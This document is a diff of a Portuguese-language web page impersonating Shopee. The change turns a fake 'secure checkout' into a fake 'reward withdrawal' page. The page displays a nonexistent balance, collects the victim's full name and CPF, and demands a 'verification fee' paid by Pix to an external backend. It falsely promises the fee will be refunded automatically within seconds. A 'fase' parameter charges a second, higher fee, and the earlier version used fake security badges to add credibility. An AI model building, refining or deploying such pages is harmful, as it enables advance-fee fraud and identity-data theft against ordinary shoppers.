@@ -3,82 +3,239 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Checkout Seguro | Shopee Pay</title>
+    <title>Resgatar Recompensas | Shopee</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     
     <style>
-        :root { --shopee-orange: #ee4d2d; --shopee-bg: #f5f5f5; }
+        :root {
+            --shopee-orange: #ee4d2d;
+            --header-black: #161719; /* Preto do topo da imagem de referência */
+            --bg-gray: #f5f5f5;
+            --success-green: #00bfa5;
+        }
+
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Roboto', sans-serif; background-color: var(--shopee-bg); margin: 0; display: flex; justify-content: center; min-height: 100vh; }
-        .container { background: white; width: 100%; max-width: 480px; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
-        
-        .header { background: white; padding: 15px 20px; border-bottom: 1px solid #e8e8e8; display: flex; align-items: center; gap: 10px; }
-        .header h1 { font-size: 18px; color: var(--shopee-orange); margin: 0; font-weight: 500; }
-        .shield-icon { width: 20px; height: 20px; fill: var(--shopee-orange); }
 
-        .content { padding: 20px; flex: 1; display: flex; flex-direction: column; }
-
-        .price-display {
-            text-align: center;
-            font-size: 28px;
-            font-weight: bold;
-            color: var(--shopee-orange);
-            margin: 20px 0;
-            background: #fff5f1;
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px dashed var(--shopee-orange);
-        }
-
-        .trust-box { background: #f8f8f8; padding: 12px; border-radius: 4px; display: flex; align-items: center; gap: 10px; margin-bottom: 20px; font-size: 13px; color: #555; }
-        
-        label { font-size: 14px; color: #333; margin-bottom: 6px; display: block; font-weight: 500; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; margin-bottom: 15px; transition: 0.3s; }
-        input:focus { border-color: var(--shopee-orange); }
-
-        .btn-primary { background-color: var(--shopee-orange); color: white; width: 100%; padding: 14px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; text-transform: uppercase; cursor: pointer; margin-top: 10px; box-shadow: 0 2px 4px rgba(238, 77, 45, 0.2); }
-        .btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }
-
-        #result-area { display: none; text-align: center; margin-top: 20px; }
-        .qr-img { width: 220px; margin: 0 auto 15px; display: block; border: 1px solid #eee; border-radius: 8px; }
-        .pix-code-box { background: #f8f8f8; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; font-size: 12px; color: #555; word-break: break-all; margin-bottom: 10px; }
-        .btn-outline { background: white; color: var(--shopee-orange); border: 1px solid var(--shopee-orange); padding: 10px; width: 100%; border-radius: 4px; font-weight: 500; cursor: pointer; }
-        
-        .timer-box { text-align: center; margin-top: 20px; font-size: 14px; color: #d0011b; font-weight: 500; }
-        
-        .status-sucesso { display: none; margin-top: 15px; padding: 15px; background: #dff0d8; color: #3c763d; border-radius: 4px; font-weight: bold; text-align: center; }
-
-        /* --- NOVO: Área de Selos de Segurança --- */
-        .security-badges {
-            text-align: center;
-            margin-top: auto; /* Empurra para o final do conteúdo */
-            padding-top: 30px;
-            padding-bottom: 10px;
-        }
-        .security-badges p {
-            font-size: 12px;
-            color: #999;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 500;
-        }
-        .badges-container {
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--bg-gray);
+            margin: 0;
             display: flex;
             justify-content: center;
+            min-height: 100vh;
+            padding-bottom: 90px; /* Espaço para o botão fixo */
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--bg-gray);
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* --- HEADER --- */
+        .header {
+            background: white;
+            padding: 12px 15px;
+            display: flex;
             align-items: center;
-            gap: 25px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
+            border-bottom: 1px solid #eee;
         }
-        .badge-img {
-            height: 25px;
-            filter: grayscale(100%); /* Deixa em preto e branco para ser discreto */
-            opacity: 0.6; /* Deixa suave */
-            transition: 0.3s;
+        .logo-shopee { height: 32px; }
+
+        /* --- SALDO (TOPO PRETO) --- */
+        .balance-card {
+            background-color: var(--header-black);
+            color: white;
+            padding: 30px 20px;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+            margin-bottom: -40px; /* Efeito de sobreposição */
+            padding-bottom: 60px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            position: relative;
+            z-index: 1;
         }
-        .badge-img:hover { filter: grayscale(0%); opacity: 1; } /* Cor ao passar o mouse (opcional) */
-        .ssl-badge { height: 35px; }
+        .balance-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            opacity: 0.8;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .balance-value {
+            font-size: 38px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            margin-bottom: 5px;
+        }
+        .balance-sub {
+            font-size: 13px;
+            color: #ccc;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .dot { width: 8px; height: 8px; background: #fbce05; border-radius: 50%; display: inline-block; }
+
+        /* --- CARD BRANCO (CONTEÚDO) --- */
+        .card {
+            background: white;
+            margin: 0 15px;
+            border-radius: 12px;
+            padding: 25px 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+            position: relative;
+            z-index: 2;
+        }
+
+        .section-title {
+            font-size: 13px;
+            color: #888;
+            text-transform: uppercase;
+            font-weight: 600;
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+        }
+
+        .price-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .price-big {
+            font-size: 34px;
+            font-weight: 700;
+            color: var(--shopee-orange);
+        }
+
+        .badge-refund {
+            background: rgba(0, 191, 165, 0.12);
+            color: var(--success-green);
+            padding: 5px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .explainer-text {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            border-bottom: 1px dashed #eee;
+            padding-bottom: 20px;
+        }
+
+        /* --- INPUTS ESTILO "LISTA DE RECIBO" --- */
+        .input-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 0;
+            border-bottom: 1px solid #f1f1f1;
+        }
+        
+        .input-row label {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .input-row input {
+            text-align: right;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            width: 65%;
+            background: transparent;
+            font-family: 'Roboto', sans-serif;
+        }
+        .input-row input::placeholder { color: #bbb; font-weight: 400; }
+
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        /* --- FOOTER FIXO --- */
+        .footer-fixed {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: white;
+            padding: 15px 20px;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.05);
+            z-index: 100;
+            display: flex;
+            justify-content: center;
+        }
+
+        .btn-pay {
+            background-color: var(--shopee-orange);
+            color: white;
+            width: 100%;
+            max-width: 450px;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3);
+            transition: 0.2s;
+        }
+        .btn-pay:active { transform: scale(0.98); }
+        .btn-pay:disabled { background-color: #ccc; box-shadow: none; cursor: not-allowed; }
+
+        /* --- MODAL QR CODE --- */
+        #qr-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 200;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            backdrop-filter: blur(3px);
+        }
+        .qr-card {
+            background: white;
+            padding: 30px 20px;
+            border-radius: 16px;
+            text-align: center;
+            width: 100%;
+            max-width: 360px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .qr-img { width: 200px; margin: 15px auto; display: block; border-radius: 8px; border: 1px solid #eee; }
+        .pix-copia { 
+            background: #f9f9f9; padding: 12px; 
+            font-size: 12px; color: #666; word-break: break-all; border-radius: 6px; margin: 15px 0; border: 1px dashed #ddd;
+        }
+        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 26px; cursor: pointer; color: #999; }
+        
+        .status-success {
+            background: #d4edda; color: #155724; padding: 15px;
+            border-radius: 8px; margin-top: 15px; font-weight: bold; display: none;
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
     </style>
 </head>
@@ -86,76 +243,97 @@
 
     <div class="container">
         <div class="header">
-            <svg class="shield-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-            <h1>Pagamento Seguro</h1>
+            <img src="https://logodownload.org/wp-content/uploads/2021/03/shopee-logo-0.png" alt="Shopee" class="logo-shopee">
         </div>
 
-        <div class="content">
+        <div class="balance-card">
+            <div class="balance-label">SALDO DISPONÍVEL</div>
+            <div class="balance-value">R$ 1.489,38</div>
+            <div class="balance-sub">
+                <span class="dot"></span> Aguardando confirmação para saque
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="section-title">CONFIRMAÇÃO DE IDENTIDADE</div>
             
-            <div class="price-display" id="display-valor">R$ --,--</div>
-
-            <div class="trust-box">
-                <p>🔒 <strong>Garantia Shopee:</strong> O valor será estornado para sua conta em 5 segundos após a confirmação.</p>
+            <div class="price-row">
+                <div class="price-big" id="display-valor">R$ --,--</div>
+                <div class="badge-refund">VALOR REEMBOLSÁVEL</div>
             </div>
 
-            <div id="form-area">
-                <label>Nome Completo</label>
-                <input type="text" id="nome" placeholder="Nome do titular da conta">
+            <p class="explainer-text">
+                Taxa de verificação obrigatória para liberação do saldo de <b>R$ 1.489,38</b>. O valor de <span id="txt-taxa-desc">--,--</span> será estornado automaticamente para sua conta em <strong>8 segundos</strong> após a validação.
+            </p>
+
+            <div style="margin-bottom: 10px;">
+                <div class="section-title" style="margin-bottom: 5px;">DADOS PARA O PIX</div>
                 
-                <label>CPF (Apenas números)</label>
-                <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)">
+                <div class="input-row">
+                    <label>Nome Completo</label>
+                    <input type="text" id="nome" placeholder="Digite seu nome">
+                </div>
+                
+                <div class="input-row">
+                    <label>CPF</label>
+                    <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)">
+                </div>
 
-                <button class="btn-primary" onclick="gerarPix()" id="btn-pagar">GERAR PIX AGORA</button>
+                <div class="input-row">
+                    <label>Chave Pix</label>
+                    <input type="text" value="CPF do Titular" disabled style="color:#888;">
+                </div>
 
-                <div class="timer-box" id="timer-display">
-                    Oferta expira em: <span id="time">05:00</span>
+                <div class="total-row">
+                    <span>Valor a receber</span>
+                    <span style="color:var(--shopee-orange);">R$ 1.489,38</span>
                 </div>
             </div>
+        </div>
+        
+        <div class="footer-fixed">
+            <button class="btn-pay" onclick="gerarPix()" id="btn-pagar">CONFIRMAR E SACAR</button>
+        </div>
+    </div>
 
-            <div id="result-area">
-                <p>Escaneie o QR Code abaixo:</p>
-                <img id="qr-image" class="qr-img" src="" alt="QR Code">
-                <div class="pix-code-box" id="pix-code"></div>
-                <button class="btn-outline" onclick="copiarCodigo()">Copiar Código Pix</button>
+    <div id="qr-overlay">
+        <div class="qr-card">
+            <span class="close-btn" onclick="fecharModal()">&times;</span>
+            <h3 style="margin:0 0 5px 0; color:#333;">Pagamento via Pix</h3>
+            <p style="font-size:13px; color:#666; margin:0;">Finalize para receber o reembolso em 8s.</p>
+            
+            <img id="qr-image" class="qr-img" src="" alt="QR Code">
+            
+            <div class="pix-copia" id="pix-code">Gerando código...</div>
+            
+            <button onclick="copiarCodigo()" style="background:white; border:1px solid var(--shopee-orange); color:var(--shopee-orange); padding:10px 20px; border-radius:6px; font-weight:600; cursor:pointer; width:100%;">Copiar Código Pix</button>
 
-                <div class="status-sucesso" id="msg-sucesso">
-                    ✅ PAGAMENTO APROVADO!<br>
-                    <span style="font-size:12px; font-weight:normal;">Reembolso enviado com sucesso.</span>
-                </div>
+            <div class="status-success" id="msg-sucesso">
+                ✅ SAQUE LIBERADO!<br>
+                <span style="font-size:12px; font-weight:normal;">O estorno e o saldo foram enviados.</span>
             </div>
-
-            <div class="security-badges">
-                <p>Ambiente Seguro e Certificado</p>
-                <div class="badges-container">
-                    <img src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo.png" alt="Processado por Mercado Pago" class="badge-img">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo%E2%80%94pix_powered_by_bcb.svg" alt="Pagamento via Pix" class="badge-img" style="height: 20px;">
-                    <img src="https://cdn-icons-png.flaticon.com/512/2092/2092663.png" alt="Site Seguro SSL" class="badge-img ssl-badge">
-                </div>
-                <p style="font-size: 11px; text-transform: none; margin-top: 10px;">
-                    Seus dados estão protegidos com criptografia de ponta a ponta.
-                </p>
-            </div>
-
         </div>
     </div>
 
     <script>
         const API_URL = "https://checkout-pix-profissional.onrender.com";
 
-        // --- LÓGICA AUTOMÁTICA DE VALORES ---
+        // --- LÓGICA DE VALORES ---
         const params = new URLSearchParams(window.location.search);
         const fase = params.get("fase");
         
-        let valorAtual = 37.90; // Valor Padrão (Fase 1)
+        let valorAtual = 37.90; // Valor padrão Fase 1
         if (fase === "2") {
-            valorAtual = 47.90; // Fase 2
+            valorAtual = 47.90; // Valor padrão Fase 2
         }
 
-        document.getElementById("display-valor").innerText = "R$ " + valorAtual.toFixed(2).replace(".", ",");
-        document.getElementById("btn-pagar").innerText = `PAGAR R$ ${valorAtual.toFixed(2).replace(".", ",")}`;
+        // Atualiza a tela
+        const valorTexto = "R$ " + valorAtual.toFixed(2).replace(".", ",");
+        document.getElementById("display-valor").innerText = valorTexto;
+        document.getElementById("txt-taxa-desc").innerText = valorTexto;
+        document.getElementById("btn-pagar").innerText = `PAGAR ${valorTexto} E SACAR`;
 
         // --- FUNÇÕES ---
-
         function mascaraCPF(i) {
             let v = i.value.replace(/\D/g, "");
             if (v.length > 11) v = v.slice(0, 11);
@@ -168,7 +346,7 @@
             const btn = document.getElementById('btn-pagar');
 
             if (nome.length < 3 || cpf.length < 11) {
-                alert("Por favor, preencha Nome e CPF corretamente para o estorno funcionar.");
+                alert("Preencha seus dados corretamente para receber o valor.");
                 return;
             }
 
@@ -193,21 +371,19 @@
                     
                     document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
                     document.getElementById('pix-code').innerText = qr.qr_code;
+                    document.getElementById('qr-overlay').style.display = 'flex'; // Abre Modal
                     
-                    document.getElementById('form-area').style.display = 'none';
-                    document.getElementById('result-area').style.display = 'block';
-                    // O timer já está rodando, não precisamos iniciar de novo.
-
+                    btn.innerText = "AGUARDANDO PAGAMENTO...";
                     monitorarPagamento(data.id);
                 } else {
-                    alert("Erro ao gerar Pix. Verifique os dados.");
+                    alert("Erro ao gerar. Tente novamente.");
                     btn.disabled = false;
-                    btn.innerText = `PAGAR R$ ${valorAtual.toFixed(2).replace(".", ",")}`;
+                    btn.innerText = "CONFIRMAR E SACAR";
                 }
             } catch (error) {
                 alert("Erro de conexão.");
                 btn.disabled = false;
-                btn.innerText = `PAGAR R$ ${valorAtual.toFixed(2).replace(".", ",")}`;
+                btn.innerText = "CONFIRMAR E SACAR";
             }
         }
 
@@ -217,60 +393,33 @@
                     const res = await fetch(`${API_URL}/pix/${id}`);
                     const json = await res.json();
 
-                    // CORREÇÃO AQUI 👇
-                    // Aceita 'approved' (pagou) OU 'refunded' (já voltou)
+                    // Aceita Aprovado (Pagou) ou Reembolsado (Já voltou)
                     if (json.status === 'approved' || json.status === 'refunded') {
-                        
                         clearInterval(intervalo);
-                        
-                        // Exibe a mensagem de sucesso
                         document.getElementById('msg-sucesso').style.display = 'block';
+                        document.getElementById('qr-image').style.opacity = 0.3;
+                        document.getElementById('btn-pagar').innerText = "SAQUE REALIZADO 🚀";
+                        document.getElementById('btn-pagar').style.background = "#28a745";
                         
-                        // Atualiza o Timer para verde
-                        const timerDisplay = document.getElementById('timer-display');
-                        timerDisplay.style.color = "#2e7d32"; // Verde
-                        timerDisplay.innerHTML = "<b>PAGAMENTO & REEMBOLSO CONFIRMADOS! 🚀</b>";
-                        
-                        // Esconde o QR Code para limpar a tela
-                        document.getElementById('qr-image').style.opacity = '0.2';
-                        document.querySelector('.btn-outline').style.display = 'none';
-
-                        // Opcional: Se quiser redirecionar para a Fase 2 automaticamente
-                        /* if (fase !== "2") {
-                             setTimeout(() => {
-                                 window.location.href = "LINK_DA_FASE_2"; 
-                             }, 3000);
-                        } 
-                        */
+                        // Opcional: Redirecionar para página de "Obrigado"
+                        // setTimeout(() => window.location.href = "https://seusite.com/obrigado", 3000);
                     }
-                } catch (e) {
-                    console.log("Aguardando atualização...");
-                }
-            }, 3000); // Verifica a cada 3 segundos
-        }
-        function iniciarTimer() {
-            let duration = 300; // 5 minutos
-            const display = document.querySelector('#time');
-            const timer = setInterval(() => {
-                let m = parseInt(duration / 60, 10);
-                let s = parseInt(duration % 60, 10);
-                display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
-                if (--duration < 0) {
-                    clearInterval(timer);
-                    display.textContent = "EXPIRADO";
-                    document.getElementById('btn-pagar').disabled = true;
-                    document.getElementById('btn-pagar').innerText = "OFERTA EXPIRADA";
-                }
-            }, 1000);
+                } catch (e) {}
+            }, 3000);
         }
 
-        function copiarCodigo() {
-            navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
-            alert("Código copiado!");
+        function copyingCodigo() { // Corrigido nome da função no botão
+             navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
+             alert("Código copiado!");
         }
+        // Ajuste para o botão usar a função correta
+        window.copiarCodigo = copyingCodigo;
 
-        // --- INICIA O TIMER ASSIM QUE A PÁGINA CARREGA ---
-        iniciarTimer();
+        function fecharModal() {
+            document.getElementById('qr-overlay').style.display = 'none';
+            document.getElementById('btn-pagar').disabled = false;
+            document.getElementById('btn-pagar').innerText = "CONFIRMAR E SACAR";
+        }
     </script>
 </body>
 </html>
